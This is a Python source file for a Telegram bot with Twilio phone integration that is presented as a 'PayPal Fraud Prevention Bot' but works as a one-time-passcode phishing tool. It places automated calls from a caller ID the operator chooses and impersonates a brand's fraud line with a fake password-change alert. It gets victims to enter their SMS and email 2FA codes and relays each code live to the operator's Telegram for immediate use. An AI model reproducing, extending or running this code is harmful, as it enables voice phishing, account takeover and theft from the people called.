#!/usr/bin/env python3
"""
Advanced Telegram Bot with Twilio IVR Integration - Two-Factor Verification
- Real-time call tracking and notifications
- SMS code collection (6 digits)
- Email code collection (6 digits)
- Telegram verification buttons
- Call event logging
"""

import os
import sys
import subprocess
import logging
import json
from typing import Optional
from datetime import datetime
import threading
import time

# Install required packages
def install_packages():
    """Install required Python packages"""
    packages = [
        'python-telegram-bot==21.1',
        'twilio==9.0.0',
        'flask==3.0.0',
        'requests==2.31.0'
    ]
    
    for package in packages:
        try:
            __import__(package.split('==')[0].replace('-', '_'))
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q"])

install_packages()

from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse
from flask import Flask, request
import asyncio

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = int(os.getenv('TELEGRAM_CHAT_ID', 0))

TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')
TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER')

RENDER_URL = os.getenv('RENDER_URL', 'http://localhost:5000')

# Validate configuration
if not all([TELEGRAM_BOT_TOKEN, TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_PHONE_NUMBER]):
    print("❌ ERROR: Missing required environment variables!")
    sys.exit(1)

# Flask app
app = Flask(__name__)

# Twilio client
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Global call tracking dictionary
# Structure: {call_sid: {customer_number, customer_name, service_name, status, sms_code, email_code, attempt, verification_stage}}
active_calls = {}

# ==================== TELEGRAM BOT HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start command handler"""
    welcome_message = """
👋 Welcome to the PayPal Fraud Prevention Bot!

📞 **How to make a call:**

Use the `/call` command with the following format:

```
/call <customer_number> <our_number> <customer_name> <service_name>
```

**Example:**
```
/call +1234567890 +12566967661 John Smith PayPal
```

**What happens:**
1. Bot initiates a call to the customer
2. Customer hears PayPal fraud prevention script
3. Customer presses 1 to continue
4. You get notified in Telegram
5. Customer enters SMS 6-digit code
6. Code is sent to you with verification buttons
7. You verify if SMS code is valid
8. If valid, you can request email code
9. Customer enters email 6-digit code
10. Code is sent to you with verification buttons
11. You verify if email code is valid
12. Call continues or ends based on verification

⚠️ **Important:** Make sure phone numbers include country code (e.g., +1 for USA)
    """
    await update.message.reply_text(welcome_message, parse_mode='Markdown')


async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /call command to initiate a phone call"""
    
    if not context.args or len(context.args) < 4:
        error_msg = """
❌ **Invalid format!**

Please use: `/call <customer_number> <our_number> <customer_name> <service_name>`

Example:
`/call +1234567890 +12566967661 John Smith PayPal`
        """
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        return
    
    try:
        customer_number = context.args[0]
        our_number = context.args[1]
        customer_name = context.args[2]
        service_name = " ".join(context.args[3:])
        
        # Validate phone numbers
        if not customer_number.startswith('+'):
            customer_number = '+' + customer_number
        if not our_number.startswith('+'):
            our_number = '+' + our_number
        
        # Send initial message
        processing_msg = await update.message.reply_text(
            f"📞 Initiating call...\n\n"
            f"From: {our_number}\n"
            f"To: {customer_number}\n"
            f"Customer: {customer_name}\n"
            f"Service: {service_name}"
        )
        
        # Create the call
        call = twilio_client.calls.create(
            to=customer_number,
            from_=our_number,
            url=f"{RENDER_URL}/voice",
            method="POST",
            status_callback=f"{RENDER_URL}/call-status",
            status_callback_method="POST"
        )
        
        # Store call information
        active_calls[call.sid] = {
            'customer_number': customer_number,
            'customer_name': customer_name,
            'service_name': service_name,
            'our_number': our_number,
            'telegram_chat_id': update.effective_chat.id,
            'status': 'initiated',
            'sms_code': None,
            'email_code': None,
            'sms_attempt': 0,
            'email_attempt': 0,
            'verification_stage': 'sms',  # sms or email
            'sms_verified': False,
            'email_verified': False,
            'message_id': processing_msg.message_id,
            'created_at': datetime.now().isoformat()
        }
        
        # Send call initiated notification
        notification = f"""
📞 **CALL INITIATED**

Call SID: `{call.sid}`
From: {our_number}
To: {customer_number}
Customer: {customer_name}
Service: {service_name}
Status: {call.status}
Time: {datetime.now().strftime('%H:%M:%S')}
        """
        await update.message.bot.send_message(
            chat_id=update.effective_chat.id,
            text=notification,
            parse_mode='Markdown'
        )
        
        logger.info(f"Call initiated: {call.sid} to {customer_number}")
        
    except Exception as e:
        error_msg = f"❌ **Error initiating call:**\n\n`{str(e)}`"
        await update.message.reply_text(error_msg, parse_mode='Markdown')
        logger.error(f"Error in call_command: {str(e)}")


async def verify_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle code verification button clicks"""
    query = update.callback_query
    await query.answer()
    
    # Parse callback data: verify_CALLSID_SMS/EMAIL_VALID/INVALID or request_email_CALLSID
    data_parts = query.data.split('_')
    
    if data_parts[0] == 'request':
        # Request email code button clicked
        call_sid = data_parts[2]
        if call_sid not in active_calls:
            await query.edit_message_text("❌ Call not found!")
            return
        
        call_info = active_calls[call_sid]
        call_info['verification_stage'] = 'email'
        call_info['email_attempt'] = 0
        
        result_text = f"""
📧 **EMAIL CODE REQUESTED**

Call SID: `{call_sid}`
Customer: {call_info['customer_name']}
Status: Waiting for email code from customer
Time: {datetime.now().strftime('%H:%M:%S')}

Customer will now be asked to enter the 6-digit code sent to their email.
        """
        await query.edit_message_text(result_text, parse_mode='Markdown')
        
        # Send notification to customer via call
        asyncio.run(send_telegram_notification(
            call_sid,
            f"📧 **EMAIL CODE VERIFICATION INITIATED**\n\nCustomer {call_info['customer_name']} will now be asked for email code."
        ))
        
        logger.info(f"Email code verification requested for: {call_sid}")
    
    else:
        # Code verification (SMS or EMAIL)
        call_sid = data_parts[1]
        code_type = data_parts[2]  # SMS or EMAIL
        is_valid = data_parts[3] == 'VALID'
        
        if call_sid not in active_calls:
            await query.edit_message_text("❌ Call not found!")
            return
        
        call_info = active_calls[call_sid]
        
        if code_type == 'SMS':
            code = call_info.get('sms_code', 'N/A')
            if is_valid:
                result_text = f"""
✅ **SMS CODE VERIFIED - VALID**

Call SID: `{call_sid}`
Code: `{code}`
Customer: {call_info['customer_name']}
Status: SMS code accepted - Requesting email code
Time: {datetime.now().strftime('%H:%M:%S')}
                """
                call_info['sms_verified'] = True
            else:
                result_text = f"""
❌ **SMS CODE VERIFIED - INVALID**

Call SID: `{call_sid}`
Code: `{code}`
Customer: {call_info['customer_name']}
Status: SMS code rejected - Customer will be asked to try again
Time: {datetime.now().strftime('%H:%M:%S')}
                """
                call_info['sms_verified'] = False
        
        elif code_type == 'EMAIL':
            code = call_info.get('email_code', 'N/A')
            if is_valid:
                result_text = f"""
✅ **EMAIL CODE VERIFIED - VALID**

Call SID: `{call_sid}`
Code: `{code}`
Customer: {call_info['customer_name']}
Status: Email code accepted - All verifications complete
Time: {datetime.now().strftime('%H:%M:%S')}
                """
                call_info['email_verified'] = True
            else:
                result_text = f"""
❌ **EMAIL CODE VERIFIED - INVALID**

Call SID: `{call_sid}`
Code: `{code}`
Customer: {call_info['customer_name']}
Status: Email code rejected - Customer will be asked to try again
Time: {datetime.now().strftime('%H:%M:%S')}
                """
                call_info['email_verified'] = False
        
        await query.edit_message_text(result_text, parse_mode='Markdown')
        logger.info(f"Code verification: {call_sid} - Type: {code_type} - Valid: {is_valid}")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Help command handler"""
    help_text = """
📚 **Help**

**Available Commands:**
- `/start` - Show welcome message
- `/help` - Show this help message
- `/call` - Make a phone call

**Call Command Format:**
`/call <customer_number> <our_number> <customer_name> <service_name>`

**Example:**
`/call +1234567890 +12566967661 John Smith PayPal`

**Two-Factor Verification Flow:**
1. Bot calls the customer
2. Customer hears fraud prevention script
3. Customer presses 1
4. You get notified
5. Customer enters SMS 6-digit code
6. You verify SMS code (Valid/Invalid)
7. If valid, you can request email code
8. Customer enters email 6-digit code
9. You verify email code (Valid/Invalid)
10. Call continues or ends based on verification
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")


# ==================== FLASK WEBHOOK HANDLERS ====================

@app.route('/voice', methods=['POST'])
def voice_webhook():
    """Handle incoming call webhook from Twilio"""
    try:
        call_sid = request.form.get('CallSid')
        call_status = request.form.get('CallStatus')
        digits = request.form.get('Digits', '')
        
        logger.info(f"Voice webhook: {call_sid}, status: {call_status}, digits: {digits}")
        
        # Get call info
        call_info = active_calls.get(call_sid, {})
        customer_name = call_info.get('customer_name', 'Customer')
        service_name = call_info.get('service_name', 'PayPal')
        
        response = VoiceResponse()
        
        # Determine call stage based on digits and verification stage
        if not digits:
            # Initial greeting - ask to press 1
            greeting = f"Hello {customer_name}. This is the {service_name} Fraud Prevention Line. We have called because of an attempt to change your password on your {service_name} account. If this was not you, press 1."
            response.say(greeting, voice='alice')
            response.gather(
                num_digits=1,
                action=f"{RENDER_URL}/voice",
                method="POST",
                timeout=10
            )
        
        elif digits == '1':
            # User pressed 1 - ask for SMS code
            if call_info:
                call_info['status'] = 'awaiting_sms_code'
                call_info['verification_stage'] = 'sms'
                # Send Telegram notification
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"🔔 **CUSTOMER PRESSED 1**\n\nCustomer {customer_name} pressed 1. Waiting for SMS 6-digit code."
                ))
            
            response.say("To block this request, please enter the 6 digits code sent to your mobile device.", voice='alice')
            response.gather(
                num_digits=6,
                action=f"{RENDER_URL}/voice",
                method="POST",
                timeout=15
            )
        
        elif len(digits) == 6 and call_info.get('verification_stage') == 'sms':
            # User entered SMS 6-digit code
            if call_info:
                call_info['sms_code'] = digits
                call_info['status'] = 'sms_code_received'
                # Send Telegram notification with verification buttons
                asyncio.run(send_sms_code_to_telegram(call_sid, digits, customer_name))
            
            response.say("Thank you. We have received your code. Please hold while we verify.", voice='alice')
            response.pause(length=2)
            
            # Wait for SMS verification (check every 2 seconds for up to 30 seconds)
            for i in range(15):
                if call_info.get('sms_verified') is not None:
                    break
                time.sleep(2)
            
            # Check SMS verification result
            if call_info.get('sms_verified'):
                response.say("Thank you, your code has been verified. Please hold for additional verification.", voice='alice')
                call_info['status'] = 'sms_verified'
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"✅ **SMS CODE ACCEPTED**\n\nWaiting for you to request email code verification..."
                ))
                response.pause(length=3)
            else:
                # SMS code invalid
                response.say("That code is incorrect. Please try again.", voice='alice')
                call_info['sms_attempt'] = call_info.get('sms_attempt', 0) + 1
                
                if call_info['sms_attempt'] < 1:  # Only one attempt
                    response.gather(
                        num_digits=6,
                        action=f"{RENDER_URL}/voice",
                        method="POST",
                        timeout=15
                    )
                else:
                    response.say("We were unable to verify your code. The call will now end. Please contact support.", voice='alice')
                    call_info['status'] = 'sms_failed'
                    asyncio.run(send_telegram_notification(
                        call_sid,
                        f"❌ **SMS VERIFICATION FAILED**\n\nCustomer {customer_name} - Failed to verify SMS code. Call ended."
                    ))
        
        elif len(digits) == 6 and call_info.get('verification_stage') == 'email':
            # User entered EMAIL 6-digit code
            if call_info:
                call_info['email_code'] = digits
                call_info['status'] = 'email_code_received'
                # Send Telegram notification with verification buttons
                asyncio.run(send_email_code_to_telegram(call_sid, digits, customer_name))
            
            response.say("Thank you. We have received your email code. Please hold while we verify.", voice='alice')
            response.pause(length=2)
            
            # Wait for EMAIL verification (check every 2 seconds for up to 30 seconds)
            for i in range(15):
                if call_info.get('email_verified') is not None:
                    break
                time.sleep(2)
            
            # Check EMAIL verification result
            if call_info.get('email_verified'):
                response.say("Thank you, your code has been verified. Goodbye.", voice='alice')
                call_info['status'] = 'completed'
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"✅ **CALL COMPLETED SUCCESSFULLY**\n\nCustomer {customer_name} - Both SMS and Email codes verified. Call ended."
                ))
            else:
                # Email code invalid
                response.say("That code is incorrect. Please try again.", voice='alice')
                call_info['email_attempt'] = call_info.get('email_attempt', 0) + 1
                
                if call_info['email_attempt'] < 1:  # Only one attempt
                    response.gather(
                        num_digits=6,
                        action=f"{RENDER_URL}/voice",
                        method="POST",
                        timeout=15
                    )
                else:
                    response.say("We were unable to verify your email code. The call will now end. Please contact support.", voice='alice')
                    call_info['status'] = 'email_failed'
                    asyncio.run(send_telegram_notification(
                        call_sid,
                        f"❌ **EMAIL VERIFICATION FAILED**\n\nCustomer {customer_name} - Failed to verify email code. Call ended."
                    ))
        
        else:
            # Invalid input
            response.say("Invalid input. Please try again.", voice='alice')
            if call_info.get('verification_stage') == 'sms':
                response.gather(
                    num_digits=6,
                    action=f"{RENDER_URL}/voice",
                    method="POST",
                    timeout=15
                )
            else:
                response.gather(
                    num_digits=1,
                    action=f"{RENDER_URL}/voice",
                    method="POST",
                    timeout=10
                )
        
        return str(response)
    
    except Exception as e:
        logger.error(f"Error in voice_webhook: {str(e)}")
        response = VoiceResponse()
        response.say("An error occurred. Please try again later.")
        return str(response)


@app.route('/call-status', methods=['POST'])
def call_status_webhook():
    """Handle call status updates from Twilio"""
    try:
        call_sid = request.form.get('CallSid')
        call_status = request.form.get('CallStatus')
        
        if call_sid in active_calls:
            call_info = active_calls[call_sid]
            customer_name = call_info.get('customer_name', 'Customer')
            
            # Send status notifications
            if call_status == 'ringing':
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"📞 **CALL RINGING**\n\nCalling {customer_name}...\nTime: {datetime.now().strftime('%H:%M:%S')}"
                ))
            
            elif call_status == 'in-progress':
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"👤 **CALL ANSWERED - HUMAN PICKED UP**\n\n{customer_name} has answered the call.\nTime: {datetime.now().strftime('%H:%M:%S')}"
                ))
            
            elif call_status == 'completed':
                duration = request.form.get('CallDuration', 'N/A')
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"📞 **CALL ENDED**\n\nCustomer: {customer_name}\nDuration: {duration} seconds\nStatus: {call_info.get('status', 'unknown')}\nTime: {datetime.now().strftime('%H:%M:%S')}"
                ))
                # Clean up
                if call_sid in active_calls:
                    del active_calls[call_sid]
            
            elif call_status == 'failed':
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"❌ **CALL FAILED**\n\nCustomer: {customer_name}\nReason: Call could not be connected\nTime: {datetime.now().strftime('%H:%M:%S')}"
                ))
                if call_sid in active_calls:
                    del active_calls[call_sid]
            
            elif call_status == 'no-answer':
                asyncio.run(send_telegram_notification(
                    call_sid,
                    f"📱 **NO ANSWER / VOICEMAIL DETECTED**\n\nCustomer: {customer_name}\nTime: {datetime.now().strftime('%H:%M:%S')}"
                ))
                if call_sid in active_calls:
                    del active_calls[call_sid]
            
            call_info['status'] = call_status
            logger.info(f"Call {call_sid} status: {call_status}")
        
        return 'OK', 200
    
    except Exception as e:
        logger.error(f"Error in call_status_webhook: {str(e)}")
        return 'ERROR', 500


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return {'status': 'ok'}, 200


# ==================== ASYNC TELEGRAM HELPERS ====================

async def send_telegram_notification(call_sid: str, message: str):
    """Send notification to Telegram"""
    try:
        from telegram import Bot
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        await bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {str(e)}")


async def send_sms_code_to_telegram(call_sid: str, code: str, customer_name: str):
    """Send SMS code to Telegram with verification buttons"""
    try:
        from telegram import Bot
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        
        # Create verification buttons
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Valid", callback_data=f"verify_{call_sid}_SMS_VALID"),
                InlineKeyboardButton("❌ Invalid", callback_data=f"verify_{call_sid}_SMS_INVALID")
            ]
        ])
        
        message_text = f"""
🔐 **SMS CODE RECEIVED**

Customer: {customer_name}
Code: `{code}`
Call SID: `{call_sid}`
Time: {datetime.now().strftime('%H:%M:%S')}

**Verify if this SMS code is valid:**
        """
        
        await bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=message_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error sending SMS code to Telegram: {str(e)}")


async def send_email_code_to_telegram(call_sid: str, code: str, customer_name: str):
    """Send email code to Telegram with verification buttons"""
    try:
        from telegram import Bot
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        
        # Create verification buttons
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Valid", callback_data=f"verify_{call_sid}_EMAIL_VALID"),
                InlineKeyboardButton("❌ Invalid", callback_data=f"verify_{call_sid}_EMAIL_INVALID")
            ]
        ])
        
        message_text = f"""
📧 **EMAIL CODE RECEIVED**

Customer: {customer_name}
Code: `{code}`
Call SID: `{call_sid}`
Time: {datetime.now().strftime('%H:%M:%S')}

**Verify if this EMAIL code is valid:**
        """
        
        await bot.send_message(
            chat_id=TELEGRAM_CHAT_ID,
            text=message_text,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error sending email code to Telegram: {str(e)}")


# ==================== MAIN APPLICATION ====================

def run_bot():
    """Run the Telegram bot"""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("call", call_command))
    application.add_handler(CallbackQueryHandler(verify_code_callback))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    logger.info("Starting Telegram bot...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


def run_flask():
    """Run the Flask webhook server"""
    port = int(os.getenv('PORT', 5000))
    logger.info(f"Starting Flask webhook server on port {port}...")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)


if __name__ == '__main__':
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║  Advanced Telegram Bot with Two-Factor IVR Verification    ║
    ║                                                            ║
    ║  SMS + Email code verification with real-time tracking    ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    print("\n⚙️  Configuration Check:")
    print(f"   ✓ Telegram Bot Token: {'***' + TELEGRAM_BOT_TOKEN[-10:]}")
    print(f"   ✓ Twilio Account SID: {'***' + TWILIO_ACCOUNT_SID[-10:]}")
    print(f"   ✓ Twilio Phone Number: {TWILIO_PHONE_NUMBER}")
    print(f"   ✓ Render URL: {RENDER_URL}")
    
    print("\n🚀 Starting bot...\n")
    
    # Run Flask in a separate thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Run Telegram bot in main thread
    try:
        run_bot()
    except KeyboardInterrupt:
        print("\n\n👋 Bot stopped by user")
        sys.exit(0)
